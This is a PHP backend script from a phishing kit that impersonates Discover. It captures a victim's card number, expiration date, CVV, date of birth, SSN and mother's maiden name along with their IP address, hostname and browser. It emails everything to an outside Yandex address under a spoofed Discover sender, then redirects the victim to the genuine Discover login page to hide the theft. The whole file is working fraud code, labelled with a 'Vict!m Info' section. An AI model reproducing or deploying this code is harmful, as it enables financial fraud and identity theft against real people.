<?php
require("siv.php"); 
$ip = getenv("REMOTE_ADDR");
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";

$message .= "Account Number:  ".$_POST['dadyu']."\n"; 
$message .= "Expiration Date:  ".$_POST['lesslove']."\n"; 
$message .= "CVV Information:  ".$_POST['toicey']."\n"; 
$message .= "Date of Birth:  ".$_POST['sarisia']."\n"; 
$message .= "SSN:  ".$_POST['sinisins']."\n"; 
$message .= "Mother Name:  ".$_POST['minieyg']."\n"; 

$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$send = "boydinvestment@yandex.ru";
$subject = "Stupid Discover Fuool Oil $ip";
$headers = "From:   Discover Fuool lazarus effect <customer-support@obxn-kekreio.org>";
$headers .= $_POST['diudyg']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
	  header("Location: https://portal.discover.com/customersvcs/universalLogin/ac_main");

	 
?>
